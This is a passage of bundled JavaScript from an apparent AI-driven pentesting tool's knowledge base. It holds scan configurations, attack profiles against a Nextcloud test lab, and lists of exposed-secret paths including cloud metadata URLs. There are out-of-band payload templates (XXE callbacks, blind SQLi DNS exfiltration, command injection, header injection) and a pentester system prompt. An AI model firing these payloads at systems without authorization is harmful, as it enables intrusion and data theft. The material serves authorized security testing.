          "Use ZAP Ajax Spider (browser-based) to trigger JavaScript that populates storage",
          "Enable Browser Storage passive scan rules (120000-120002)",
          "Check localStorage for JWT tokens, API keys, and session data",
          "Check sessionStorage for temporary credentials and auth state",
          "Review cookies for sensitive data without HttpOnly/Secure flags",
          "Check IndexedDB for cached API responses containing PII"
        ],
        whatToLookFor: [
          "JWT tokens in localStorage (vulnerable to XSS theft)",
          "API keys or access tokens stored client-side",
          "User PII (email, phone, SSN) in browser storage",
          "OAuth refresh tokens in localStorage",
          "Session identifiers without HttpOnly flag",
          "Cached API responses with sensitive business data"
        ],
        attackVectors: [
          "XSS + localStorage theft = full account takeover",
          "Stolen JWT from storage allows session hijacking",
          "Cached PII extraction for identity theft",
          "Refresh token theft for persistent access"
        ],
        tools: ["ZAP Ajax Spider", "Browser DevTools", "ZAP Passive Scanner"]
      },
      {
        id: "js-library-audit",
        name: "JavaScript Library Vulnerability Audit",
        description: "Identify outdated or vulnerable JavaScript libraries loaded by the application. Known CVEs in client-side libraries (jQuery, Angular, lodash, etc.) can enable XSS, prototype pollution, and other attacks.",
        zapRuleIds: [10003, 90003, 10115],
        manualSteps: [
          "Spider the target to discover all loaded JavaScript files",
          "Check for version strings in JS file headers/comments",
          "Cross-reference discovered libraries with known CVE databases",
          "Check for Sub-Resource Integrity (SRI) on CDN-loaded scripts",
          "Verify scripts are not loaded from compromised CDNs (polyfill.io)",
          "Check for outdated jQuery, Angular 1.x, lodash with prototype pollution"
        ],
        whatToLookFor: [
          "jQuery < 3.5.0 (XSS via htmlPrefilter)",
          "Angular 1.x (template injection, sandbox escape)",
          "lodash < 4.17.21 (prototype pollution)",
          "moment.js (ReDoS vulnerabilities)",
          "Scripts from polyfill.io or other compromised CDNs",
          "Missing SRI hashes on third-party scripts"
        ],
        attackVectors: [
          "Exploit known CVEs in outdated libraries",
          "Supply chain attack via compromised CDN scripts",
          "Prototype pollution leading to XSS or auth bypass",
          "ReDoS for denial of service"
        ],
        tools: ["ZAP Spider", "Retire.js", "npm audit", "Snyk"]
      }
    ];
    SOURCE_CODE_DISCLOSURE_VECTORS = [
      {
        id: "git-exposure",
        name: "Git Repository Exposure",
        zapRuleIds: [42, 40035],
        paths: ["/.git/HEAD", "/.git/config", "/.git/index", "/.git/refs/heads/main", "/.gitignore"],
        indicators: ["ref: refs/heads/", "[core]", "[remote", "DIRC"],
        exploitability: "Full source code reconstruction using git-dumper or manual object download",
        postExploitation: [
          "Reconstruct full source code history with git checkout",
          "Extract secrets from git log (committed then removed)",
          "Find internal URLs, database schemas, API documentation",
          "Discover deployment scripts and infrastructure details"
        ]
      },
      {
        id: "svn-exposure",
        name: "SVN Repository Exposure",
        zapRuleIds: [41, 40035],
        paths: ["/.svn/entries", "/.svn/wc.db", "/.svn/pristine/"],
        indicators: ["svn:entry", "SQLite format 3"],
        exploitability: "Source code extraction via SVN metadata files",
        postExploitation: [
          "Download wc.db for full file listing and metadata",
          "Extract pristine copies of source files",
          "Find credentials in SVN properties"
        ]
      },
      {
        id: "env-file-exposure",
        name: "Environment File Exposure",
        zapRuleIds: [40034, 40035, 10095],
        paths: ["/.env", "/.env.local", "/.env.production", "/.env.development", "/.env.backup", "/env.js", "/config.js"],
        indicators: ["DB_PASSWORD=", "API_KEY=", "SECRET_KEY=", "DATABASE_URL=", "AWS_"],
        exploitability: "Direct credential extraction \u2014 often contains all service credentials",
        postExploitation: [
          "Use database credentials for direct DB access",
          "Use API keys for cloud service access (AWS, GCP, Azure)",
          "Use JWT secrets to forge authentication tokens",
          "Use SMTP credentials for email spoofing",
          "Use payment gateway keys (Stripe, PayPal) for financial fraud"
        ]
      },
      {
        id: "backup-file-exposure",
        name: "Backup & Config File Exposure",
        zapRuleIds: [10095, 40035],
        paths: [
          "/web.config.bak",
          "/web.config.old",
          "/wp-config.php.bak",
          "/config.php.bak",
          "/database.yml.bak",
          "/settings.py.bak",
          "/.DS_Store",
          "/Thumbs.db",
          "/package.json",
          "/composer.json",
          "/Gemfile",
          "/requirements.txt"
        ],
        indicators: ["<?php", "connectionString", "password:", "secret_key"],
        exploitability: "Configuration files often contain database credentials and API keys",
        postExploitation: [
          "Extract database credentials from config backups",
          "Map application dependencies for known CVE exploitation",
          "Find internal service URLs and architecture details"
        ]
      },
      {
        id: "webinf-exposure",
        name: "Java WEB-INF Exposure",
        zapRuleIds: [10045],
        paths: ["/WEB-INF/web.xml", "/WEB-INF/classes/", "/WEB-INF/lib/", "/META-INF/MANIFEST.MF"],
        indicators: ["<web-app", "<servlet", "Main-Class:"],
        exploitability: "Full Java application source and configuration exposure",
        postExploitation: [
          "Extract servlet mappings and URL patterns",
          "Download compiled .class files for decompilation",
          "Find database JNDI configurations",
          "Discover internal API endpoints from web.xml"
        ]
      },
      {
        id: "cloud-metadata",
        name: "Cloud Metadata Service Exposure",
        zapRuleIds: [90034],
        paths: [
          "http://169.254.169.254/latest/meta-data/",
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://metadata.google.internal/computeMetadata/v1/",
          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        ],
        indicators: ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey"],
        exploitability: "SSRF to cloud metadata can yield temporary IAM credentials with broad access",
        postExploitation: [
          "Use temporary AWS credentials for S3 bucket access",
          "Enumerate EC2 instances and security groups",
          "Access other cloud services using instance role",
          "Pivot to internal network via cloud VPC"
        ]
      }
    ];
    BROWSER_STORAGE_CHECKS = [
      {
        storageType: "localStorage",
        zapRuleIds: [12e4, 120001, 120002],
        sensitiveKeys: [
          "token",
          "jwt",
          "access_token",
          "refresh_token",
          "id_token",
          "api_key",
          "apiKey",
          "auth",
          "session",
          "user",
          "credentials",
          "password",
          "secret",
          "private_key",
          "bearer"
        ],
        description: "localStorage persists across browser sessions and is accessible to any JavaScript on the same origin. XSS can steal all stored data.",
        extractionMethod: "Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)))"
      },
      {
        storageType: "sessionStorage",
        zapRuleIds: [12e4, 120001, 120002],
        sensitiveKeys: [
          "token",
          "jwt",
          "access_token",
          "auth_state",
          "csrf_token",
          "session_id",
          "user_data",
          "temp_credentials"
        ],
        description: "sessionStorage is cleared when the tab closes but is still vulnerable to XSS during the session.",
        extractionMethod: "Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)))"
      },
      {
        storageType: "cookies",
        zapRuleIds: [10010, 10011, 10054, 10029],
        sensitiveKeys: [
          "session",
          "JSESSIONID",
          "PHPSESSID",
          "connect.sid",
          "auth",
          "token",
          "remember_me",
          "csrf"
        ],
        description: "Cookies without HttpOnly flag are accessible to JavaScript. Missing Secure flag allows interception over HTTP.",
        extractionMethod: "document.cookie"
      },
      {
        storageType: "indexedDB",
        zapRuleIds: [12e4],
        sensitiveKeys: [
          "user_profile",
          "cached_responses",
          "offline_data",
          "encryption_keys"
        ],
        description: "IndexedDB can store large amounts of structured data including cached API responses with PII.",
        extractionMethod: "indexedDB.databases().then(dbs => console.log(dbs))"
      }
    ];
  }
});

// server/lib/knowledge/burp-pentesting-knowledge.ts
async function initBurpKnowledge() {
  if (_loaded) return;
  const data = await loadKnowledgeData("burp_pentesting_knowledge.json", FALLBACK);
  SCAN_TYPES = data.scanTypes?.length ? data.scanTypes : INLINE_SCAN_TYPES;
  ISSUE_DEFINITIONS = data.issueDefinitions || [];
  SCAN_CONFIGS = data.scanConfigs?.length ? data.scanConfigs : INLINE_SCAN_CONFIGS;
  EXTENSIONS = data.extensions || [];
  ATTACK_PROFILES = data.attackProfiles?.length ? data.attackProfiles : INLINE_ATTACK_PROFILES;
  COLLABORATOR_PAYLOADS = data.collaboratorPayloads?.length ? data.collaboratorPayloads : INLINE_COLLABORATOR_PAYLOADS;
  CROSS_TOOL_CORRELATIONS = data.crossToolCorrelations?.length ? data.crossToolCorrelations : INLINE_CROSS_TOOL_CORRELATIONS;
  LLM_PROMPTS = data.llmPrompts?.length ? data.llmPrompts : INLINE_LLM_PROMPTS;
  _loaded = true;
  console.log(`[BurpKnowledge] Loaded ${SCAN_TYPES.length} scan types, ${ISSUE_DEFINITIONS.length} issue defs, ${ATTACK_PROFILES.length} attack profiles, ${CROSS_TOOL_CORRELATIONS.length} cross-tool correlations`);
}
function getBurpScanConfigContext(technology) {
  let configs = SCAN_CONFIGS;
  if (technology) {
    configs = SCAN_CONFIGS.filter(
      (c) => c.targetTech.some((t) => t.toLowerCase().includes(technology.toLowerCase())) || c.targetTech.includes("any")
    );
    if (configs.length === 0) configs = SCAN_CONFIGS;
  }
  const sections = configs.map((c) => {
    const auditTypes = c.auditConfig.issueTypes.length > 0 ? c.auditConfig.issueTypes.join(", ") : "Passive only";
    return `### ${c.name} [${c.scanType}] (Priority: ${c.priority})
${c.description}
**Target Tech:** ${c.targetTech.join(", ")}
**Crawl:** depth=${c.crawlConfig.maxCrawlDepth}, strategy=${c.crawlConfig.crawlStrategy}
**Audit Types:** ${auditTypes}
**Insertion Points:** ${c.auditConfig.insertionPoints.join(", ")}
**Detection Methods:** ${c.auditConfig.detectionMethods.join(", ")}
**When to use:** ${c.useWhen}`;
  }).join("\n\n");
  return `## Burp Suite Scan Configurations
Select the optimal scan configuration based on target and phase:

${sections}

**Configuration Strategy:**
1. Start with full crawl_and_audit for initial reconnaissance
2. Follow up with targeted audit_only for specific vulnerability classes
3. Use passive-only for production targets or strict RoE
4. Always configure application_logins for authenticated scanning
5. Enable Collaborator for OOB detection (SSRF, blind XXE, blind SQLi)`;
}
function getBurpAttackProfileContext(vulnClass) {
  let profiles = ATTACK_PROFILES;
  if (vulnClass) {
    profiles = ATTACK_PROFILES.filter(
      (p) => p.vulnClass.toLowerCase().includes(vulnClass.toLowerCase()) || p.targetCwes.some((c) => c.toLowerCase().includes(vulnClass.toLowerCase()))
    );
    if (profiles.length === 0) profiles = ATTACK_PROFILES;
  }
  const sections = profiles.map((p) => {
    const steps = p.methodology.map((s) => `  ${s}`).join("\n");
    const zapRefs = p.zapCrossRef.map(
      (r) => `  - ZAP Alert ${r.alertId}: ${r.overlap} overlap \u2014 ${r.note}`
    ).join("\n");
    return `### ${p.name} [${p.bountyPriority.toUpperCase()}] \u2014 ${p.vulnClass}
${p.description}
**ATT&CK:** ${p.attackTechniques.join(", ")} | **CWEs:** ${p.targetCwes.join(", ")}
**Burp Tools:** ${p.burpTools.join(", ")}

**Methodology:**
${steps}

**ZAP Cross-Reference:**
${zapRefs}

**Expected Findings:** ${p.expectedFindings.join("; ")}`;
  }).join("\n\n");
  return `## Burp Attack Profiles (Bug Bounty Optimized)
${profiles.length} attack profiles for systematic vulnerability hunting:

${sections}

**Attack Profile Selection:**
1. Start with CRITICAL bounty priority profiles
2. Use Collaborator for all OOB detection vectors
3. Cross-reference ZAP findings to avoid duplicate testing
4. Chain findings across profiles for maximum impact
5. Document exploitation steps for reproducible bug reports`;
}
function getBurpCollaboratorContext() {
  const sections = COLLABORATOR_PAYLOADS.map((p) => {
    return `### ${p.vulnType} [${p.expectedInteraction.toUpperCase()}] ${p.burpExclusive ? "\u{1F512} BURP-EXCLUSIVE" : ""}
**Insertion Point:** ${p.insertionPoint}
**Payload:** \`${p.payloadTemplate}\`
**Description:** ${p.description}`;
  }).join("\n\n");
  return `## Burp Collaborator Payloads
Out-of-band detection payloads \u2014 these find vulnerabilities ZAP cannot detect:

${sections}

**Collaborator Usage Strategy:**
1. Replace {{collaborator}} with your Burp Collaborator domain
2. Send payloads via Repeater for precise control
3. Monitor Collaborator tab for DNS/HTTP/SMTP interactions
4. Any interaction confirms the vulnerability \u2014 document the timing and source
5. Use Collaborator findings as definitive proof in bug bounty reports
6. \u{1F512} BURP-EXCLUSIVE payloads have NO ZAP equivalent \u2014 these are Burp's key advantage`;
}
function getCrossToolCorrelationContext() {
  const sections = CROSS_TOOL_CORRELATIONS.map((c) => {
    return `- Burp #${c.burpIssueType} \u2194 ZAP #${c.zapAlertId}: **${c.correlationStrength}** \u2192 ${c.mergeStrategy} | Key: \`${c.deduplicationKey}\` | ${c.notes}`;
  }).join("\n");
  return `## Cross-Tool Correlation Map (Burp \u2194 ZAP)
Deduplicate and correlate findings between Burp Suite and OWASP ZAP:

${sections}

**Correlation Strategy:**
1. **exact**: Same vulnerability, same detection \u2014 merge evidence from both tools
2. **strong**: Same vuln class, different detection method \u2014 prefer the tool with higher confidence
3. **weak**: Related but different \u2014 report both with cross-reference
4. **complementary**: Different aspects of same attack surface \u2014 combine for full picture

**Deduplication Rules:**
- Use the deduplication key pattern to match findings across tools
- When merging, include evidence from BOTH tools in the report
- prefer_burp: Burp's detection is more accurate (e.g., Collaborator-confirmed)
- prefer_zap: ZAP's detection is more comprehensive (e.g., passive header checks)
- merge_evidence: Combine both \u2014 stronger report with dual-tool confirmation`;
}
function getBurpReasoningPrompt(phase) {
  const phaseMap = {
    scan_config: "burp-scan-config",
    triage: "burp-finding-triage",
    exploitation: "burp-attack-path"
  };
  const promptId = phaseMap[phase];
  if (!promptId) return null;
  return LLM_PROMPTS.find((p) => p.id === promptId) || null;
}
function buildBurpKnowledgeContext(params) {
  const sections = [];
  if (params.phase === "enumeration" || params.phase === "vuln_detection") {
    sections.push(getBurpScanConfigContext(params.technology));
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation") {
    if (params.includeAttackProfiles !== false) {
      sections.push(getBurpAttackProfileContext());
    }
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation") {
    if (params.includeCollaborator !== false) {
      sections.push(getBurpCollaboratorContext());
    }
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation" || params.phase === "reporting") {
    if (params.includeCrossToolCorrelation !== false) {
      sections.push(getCrossToolCorrelationContext());
    }
  }
  if (sections.length === 0) return "";
  return `# Burp Suite Pro Pentesting Knowledge Base

${sections.join("\n\n---\n\n")}`;
}
var FALLBACK, SCAN_TYPES, ISSUE_DEFINITIONS, SCAN_CONFIGS, EXTENSIONS, ATTACK_PROFILES, COLLABORATOR_PAYLOADS, CROSS_TOOL_CORRELATIONS, LLM_PROMPTS, _loaded, INLINE_SCAN_TYPES, INLINE_SCAN_CONFIGS, INLINE_ATTACK_PROFILES, INLINE_COLLABORATOR_PAYLOADS, INLINE_CROSS_TOOL_CORRELATIONS, INLINE_LLM_PROMPTS;
var init_burp_pentesting_knowledge = __esm({
  "server/lib/knowledge/burp-pentesting-knowledge.ts"() {
    "use strict";
    init_knowledge_loader();
    FALLBACK = {
      scanTypes: [],
      issueDefinitions: [],
      scanConfigs: [],
      extensions: [],
      attackProfiles: [],
      collaboratorPayloads: [],
      crossToolCorrelations: [],
      llmPrompts: []
    };
    SCAN_TYPES = [];
    ISSUE_DEFINITIONS = [];
    SCAN_CONFIGS = [];
    EXTENSIONS = [];
    ATTACK_PROFILES = [];
    COLLABORATOR_PAYLOADS = [];
    CROSS_TOOL_CORRELATIONS = [];
    LLM_PROMPTS = [];
    _loaded = false;
    INLINE_SCAN_TYPES = [
      {
        id: "crawl_and_audit",
        name: "Crawl and Audit",
        description: "Full crawl followed by active audit \u2014 the standard comprehensive scan",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scan_callback", "scope", "urls", "application_logins", "scan_configurations"],
        useCase: "Initial reconnaissance and vulnerability assessment of a new target",
        estimatedDuration: "30-120 min depending on app size"
      },
      {
        id: "audit_only",
        name: "Audit Only (Targeted)",
        description: "Skip crawl, audit specific URLs \u2014 faster for known endpoints",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scope", "urls", "scan_configurations"],
        useCase: "Re-testing specific endpoints after code changes or for focused vuln hunting",
        estimatedDuration: "5-30 min per endpoint group"
      },
      {
        id: "crawl_only",
        name: "Crawl Only",
        description: "Map the application without active testing \u2014 safe for production",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scope", "urls", "scan_configurations"],
        useCase: "Initial mapping before active testing, or production monitoring",
        estimatedDuration: "10-45 min"
      }
    ];
    INLINE_SCAN_CONFIGS = [
      {
        name: "nextcloud-full-audit",
        description: "Comprehensive Nextcloud audit \u2014 WebDAV, OCS API, sharing, auth endpoints",
        scanType: "crawl_and_audit",
        targetTech: ["nextcloud", "php", "webdav"],
        crawlConfig: {
          maxCrawlDepth: 8,
          maxLinkDepth: 10,
          crawlStrategy: "most_complete",
          scope: {
            include: ["/remote.php/", "/ocs/", "/index.php/", "/status.php", "/apps/"],
            exclude: ["/core/js/", "/core/css/", "/core/img/", "/.well-known/"]
          }
        },
        auditConfig: {
          issueTypes: [
            "sql_injection",
            "os_command_injection",
            "path_traversal",
            "file_upload",
            "xml_injection",
            "xxe",
            "ssrf",
            "ssti",
            "xss_reflected",
            "xss_stored",
            "csrf",
            "open_redirect",
            "header_injection",
            "ldap_injection",
            "xpath_injection",
            "http_request_smuggling",
            "deserialization"
          ],
          insertionPoints: ["url_path", "url_query", "body_params", "cookies", "headers"],
          detectionMethods: ["in_band", "out_of_band", "time_based"],
          followRedirects: true,
          concurrentRequests: 5
        },
        useWhen: "First scan of Nextcloud test lab \u2014 maps all attack surfaces",
        priority: 1
      },
      {
        name: "webdav-deep-audit",
        description: "Deep WebDAV protocol testing \u2014 PROPFIND/MOVE/COPY/LOCK injection",
        scanType: "audit_only",
        targetTech: ["webdav", "nextcloud"],
        crawlConfig: {
          maxCrawlDepth: 3,
          maxLinkDepth: 5,
          crawlStrategy: "fastest",
          scope: {
            include: ["/remote.php/dav", "/remote.php/webdav"],
            exclude: []
          }
        },
        auditConfig: {
          issueTypes: [
            "xml_injection",
            "xxe",
            "path_traversal",
            "sql_injection",
            "http_request_smuggling",
            "header_injection"
          ],
          insertionPoints: ["url_path", "body_params", "headers", "entire_body"],
          detectionMethods: ["in_band", "out_of_band", "time_based"],
          followRedirects: false,
          concurrentRequests: 3
        },
        useWhen: "Focused WebDAV testing after initial crawl identifies DAV endpoints",
        priority: 2
      },
      {
        name: "api-auth-audit",
        description: "Authentication and authorization testing \u2014 session management, CSRF, privilege escalation",
        scanType: "audit_only",
        targetTech: ["nextcloud", "php", "oauth", "saml"],
        crawlConfig: {
          maxCrawlDepth: 3,
          maxLinkDepth: 5,
          crawlStrategy: "fastest",
          scope: {
            include: ["/index.php/login", "/ocs/v2.php/cloud/users", "/index.php/settings/"],
            exclude: []
          }
        },
        auditConfig: {
          issueTypes: [
            "csrf",
            "session_fixation",
            "session_token_in_url",
            "open_redirect",
            "authentication_bypass",
            "privilege_escalation",
            "idor",
            "insecure_direct_object_reference"
          ],
          insertionPoints: ["url_query", "body_params", "cookies", "headers"],
          detectionMethods: ["in_band"],
          followRedirects: true,
          concurrentRequests: 2
        },
        useWhen: "Focused auth testing with multiple user accounts for privilege escalation",
        priority: 2
      },
      {
        name: "passive-crawl-only",
        description: "Safe passive scan \u2014 crawl and passive analysis only, no active injection",
        scanType: "crawl_only",
        targetTech: ["any"],
        crawlConfig: {
          maxCrawlDepth: 10,
          maxLinkDepth: 15,
          crawlStrategy: "most_complete",
          scope: { include: ["*"], exclude: [] }
        },
        auditConfig: {
          issueTypes: [],
          insertionPoints: [],
          detectionMethods: [],
          followRedirects: true,
          concurrentRequests: 10
        },
        useWhen: "Initial mapping of production targets or when RoE restricts active testing",
        priority: 3
      }
    ];
    INLINE_ATTACK_PROFILES = [
      {
        name: "ssrf-via-webdav",
        description: "Server-Side Request Forgery through WebDAV PROPFIND/COPY with external entity references",
        vulnClass: "SSRF",
        attackTechniques: ["T1190", "T1071.001"],
        targetCwes: ["CWE-918"],
        burpTools: ["scanner", "repeater", "collaborator"],
        methodology: [
          "1. Identify WebDAV endpoints via crawl (/remote.php/dav, /remote.php/webdav)",
          "2. Send PROPFIND with external DTD reference pointing to Collaborator",
          "3. Send COPY/MOVE with Destination header pointing to internal services",
          "4. Test LOCK with external entity in lock-token body",
          "5. Monitor Collaborator for DNS/HTTP interactions",
          "6. If interaction received, escalate to internal port scanning via SSRF",
          "7. Attempt to read internal metadata endpoints (169.254.169.254, internal APIs)"
        ],
        zapCrossRef: [
          { alertId: 40012, overlap: "partial", note: "ZAP tests basic SSRF but misses WebDAV-specific vectors" },
          { alertId: 90034, overlap: "none", note: "ZAP has no Collaborator equivalent for OOB SSRF" }
        ],
        expectedFindings: [
          "Collaborator DNS interaction from WebDAV PROPFIND",
          "Internal service response via COPY Destination header",
          "Cloud metadata exposure via SSRF chain"
        ],
        bountyPriority: "critical"
      },
      {
        name: "xxe-via-office-upload",
        description: "XML External Entity injection through document upload (DOCX/XLSX/SVG/XML)",
        vulnClass: "XXE",
        attackTechniques: ["T1190", "T1059.007"],
        targetCwes: ["CWE-611"],
        burpTools: ["scanner", "intruder", "repeater", "collaborator"],
        methodology: [
          "1. Upload crafted DOCX with XXE payload in [Content_Types].xml",
          "2. Upload SVG with external entity reference to Collaborator",
          "3. Upload XLSX with XXE in xl/sharedStrings.xml",
          "4. Test XML-based API endpoints (OCS API) with inline DTD",
          "5. Try parameter entity injection for blind XXE",
          "6. Use Collaborator to exfiltrate /etc/passwd via OOB XXE",
          "7. Chain with SSRF to access internal services"
        ],
        zapCrossRef: [
          { alertId: 90023, overlap: "partial", note: "ZAP tests basic XXE but not file-format-based vectors" }
        ],
        expectedFindings: [
          "OOB XXE via Collaborator interaction",
          "File content exfiltration via error-based XXE",
          "Internal network mapping via XXE-SSRF chain"
        ],
        bountyPriority: "critical"
      },
      {
        name: "idor-sharing-api",
        description: "Insecure Direct Object Reference in file sharing \u2014 access other users' shares",
        vulnClass: "IDOR/Broken Access Control",
        attackTechniques: ["T1080", "T1567"],
        targetCwes: ["CWE-639", "CWE-862"],
        burpTools: ["scanner", "intruder", "repeater"],
        methodology: [
          "1. Create shares as testuser1, note share IDs",
          "2. Use Intruder to enumerate share IDs (sequential/UUID patterns)",
          "3. Access shares as testuser2 \u2014 check for unauthorized access",
          "4. Modify share permissions as non-owner",
          "5. Test federated share endpoints for cross-instance access",
          "6. Check public link generation for predictable tokens",
          "7. Test share deletion as non-owner"
        ],
        zapCrossRef: [
          { alertId: 40018, overlap: "none", note: "ZAP has no IDOR-specific scanner \u2014 Burp Intruder is superior here" }
        ],
        expectedFindings: [
          "Unauthorized share access via sequential ID enumeration",
          "Permission modification by non-owner",
          "Predictable public share link tokens"
        ],
        bountyPriority: "high"
      },
      {
        name: "auth-bypass-ocsapi",
        description: "Authentication bypass via OCS API \u2014 missing auth checks, privilege escalation",
        vulnClass: "Authentication Bypass",
        attackTechniques: ["T1078", "T1548"],
        targetCwes: ["CWE-287", "CWE-269"],
        burpTools: ["scanner", "repeater", "intruder"],
        methodology: [
          "1. Map all OCS API endpoints with admin credentials",
          "2. Replay requests without auth headers \u2014 check for unprotected endpoints",
          "3. Replay admin-only requests with regular user credentials",
          "4. Test HTTP method override (X-HTTP-Method-Override, _method param)",
          "5. Test path traversal in API routes (/ocs/v2.php/cloud/../admin/)",
          "6. Check for API key leakage in responses",
          "7. Test rate limiting on login endpoint"
        ],
        zapCrossRef: [
          { alertId: 10045, overlap: "partial", note: "ZAP detects missing auth but not privilege escalation patterns" }
        ],
        expectedFindings: [
          "Unprotected admin API endpoints",
          "Privilege escalation from user to admin role",
          "Missing rate limiting on authentication endpoints"
        ],
        bountyPriority: "high"
      },
      {
        name: "stored-xss-collaboration",
        description: "Stored XSS via collaboration features \u2014 Deck cards, Forms, Talk messages, file names",
        vulnClass: "Stored XSS",
        attackTechniques: ["T1059.007"],
        targetCwes: ["CWE-79"],
        burpTools: ["scanner", "repeater", "intruder"],
        methodology: [
          "1. Inject XSS payloads in Deck card titles and descriptions",
          "2. Inject in Forms field labels and option values",
          "3. Inject in Talk chat messages (markdown rendering)",
          "4. Upload files with XSS in filename (rendered in sharing UI)",
          "5. Inject in calendar event titles and descriptions",
          "6. Test SVG upload with embedded JavaScript",
          "7. Check Content-Security-Policy bypass vectors"
        ],
        zapCrossRef: [
          { alertId: 40012, overlap: "strong", note: "ZAP active XSS scanner covers reflected; Burp better at stored XSS detection" },
          { alertId: 40014, overlap: "strong", note: "ZAP persistent XSS scanner \u2014 good overlap with Burp" }
        ],
        expectedFindings: [
          "Stored XSS in collaboration app rendering",
          "CSP bypass via SVG or data: URI",
          "DOM-based XSS in client-side rendering"
        ],
        bountyPriority: "high"
      }
    ];
    INLINE_COLLABORATOR_PAYLOADS = [
      {
        vulnType: "SSRF (WebDAV)",
        payloadTemplate: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{collaborator}}">]><d:propfind xmlns:d="DAV:"><d:prop><d:displayname>&xxe;</d:displayname></d:prop></d:propfind>',
        insertionPoint: "body_params",
        expectedInteraction: "http",
        description: "PROPFIND with external entity \u2014 triggers HTTP callback if XXE is processed",
        burpExclusive: true
      },
      {
        vulnType: "Blind XXE (File Upload)",
        payloadTemplate: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{collaborator}}/xxe">%xxe;]><root/>',
        insertionPoint: "body_params",
        expectedInteraction: "dns",
        description: "Parameter entity XXE \u2014 DNS interaction confirms XML parsing of uploaded content",
        burpExclusive: true
      },
      {
        vulnType: "SSRF (Image Preview)",
        payloadTemplate: "http://{{collaborator}}/image.png",
        insertionPoint: "url_query",
        expectedInteraction: "http",
        description: "Image URL in preview/thumbnail endpoint \u2014 HTTP callback if server fetches",
        burpExclusive: true
      },
      {
        vulnType: "Blind SQL Injection",
        payloadTemplate: "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{{collaborator}}\\\\a')))-- ",
        insertionPoint: "url_query",
        expectedInteraction: "dns",
        description: "DNS exfiltration via MySQL LOAD_FILE \u2014 confirms blind SQLi with data extraction",
        burpExclusive: true
      },
      {
        vulnType: "OS Command Injection",
        payloadTemplate: "; nslookup {{collaborator}} ;",
        insertionPoint: "body_params",
        expectedInteraction: "dns",
        description: "DNS lookup via command injection \u2014 confirms RCE capability",
        burpExclusive: false
      },
      {
        vulnType: "Email Header Injection",
        payloadTemplate: "test@test.com%0aBcc:{{collaborator}}@mail.com",
        insertionPoint: "body_params",
        expectedInteraction: "smtp",
        description: "SMTP header injection in email functionality \u2014 confirms mail relay abuse",
        burpExclusive: true
      }
    ];
    INLINE_CROSS_TOOL_CORRELATIONS = [
      { burpIssueType: 1049088, zapAlertId: 40012, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "xss:reflected:{url}:{param}", notes: "Both detect reflected XSS \u2014 merge evidence for stronger report" },
      { burpIssueType: 1049600, zapAlertId: 40014, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "xss:stored:{url}:{param}", notes: "Stored XSS \u2014 Burp often finds more insertion points" },
      { burpIssueType: 1048832, zapAlertId: 40018, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "sqli:{url}:{param}", notes: "SQL injection \u2014 Burp's detection is more accurate with fewer FPs" },
      { burpIssueType: 1049344, zapAlertId: 90023, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "xxe:{url}", notes: "XXE \u2014 Burp Collaborator provides definitive OOB proof" },
      { burpIssueType: 1050112, zapAlertId: 40012, correlationStrength: "weak", mergeStrategy: "report_both", deduplicationKey: "ssrf:{url}:{param}", notes: "SSRF \u2014 Burp Collaborator is essential, ZAP has limited SSRF detection" },
      { burpIssueType: 1048576, zapAlertId: 40019, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "cmdi:{url}:{param}", notes: "OS command injection \u2014 both tools detect, merge for completeness" },
      { burpIssueType: 2097920, zapAlertId: 10020, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "csrf:{url}", notes: "CSRF \u2014 ZAP's passive detection is comprehensive" },
      { burpIssueType: 5244416, zapAlertId: 10038, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "csp:{url}", notes: "CSP issues \u2014 ZAP's passive scanner is thorough" },
      { burpIssueType: 5243392, zapAlertId: 10035, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "hsts:{url}", notes: "Strict-Transport-Security \u2014 passive detection, ZAP is reliable" },
      { burpIssueType: 1049856, zapAlertId: 6, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "pathtraversal:{url}:{param}", notes: "Path traversal \u2014 Burp's active scanner has better payload coverage" }
    ];
    INLINE_LLM_PROMPTS = [
      {
        id: "burp-scan-config",
        phase: "scan_config",
        name: "Burp Scan Configuration Optimizer",
        systemPrompt: `You are an expert Burp Suite Professional pentester. Your role is to configure optimal Burp scans for bug bounty targets.

EXPERTISE AREAS:
- Burp REST API v0.1 scan configuration
- Crawl strategy optimization (fastest/more_complete/most_complete)
- Audit configuration for specific vulnerability classes
- Application login configuration for authenticated scanning
- Scope management to stay within RoE boundaries
- Scan resource optimization (concurrent requests, timeouts)

SCAN CONFIGURATION PRINCIPLES:
1. ALWAYS configure application_logins for authenticated scanning \u2014 unauthenticated scans miss 60%+ of attack surface
2. Use "crawl_and_audit" for initial scans, "audit_only" for re-testing specific endpoints
3. Set scope.include to match the engagement's RoE \u2014 NEVER scan out-of-scope domains
4. For Nextcloud: prioritize WebDAV, OCS API, and sharing endpoints
5. Enable Collaborator interactions for OOB vulnerability detection (SSRF, blind XXE, blind SQLi)
6. Reduce concurrent requests to 3-5 for targets behind WAF to avoid blocking
7. Configure scan_callback URL to receive real-time scan progress updates

BURP REST API SCAN REQUEST FORMAT:
{
  "scan_callback": { "url": "https://your-callback-url/burp-callback" },
  "scope": {
    "include": [{ "rule": "https://target.com/" }],
    "exclude": [{ "rule": "https://target.com/logout" }]
  },
  "urls": ["https://target.com/"],
  "application_logins": [{
    "password": "pass",
    "username": "user",
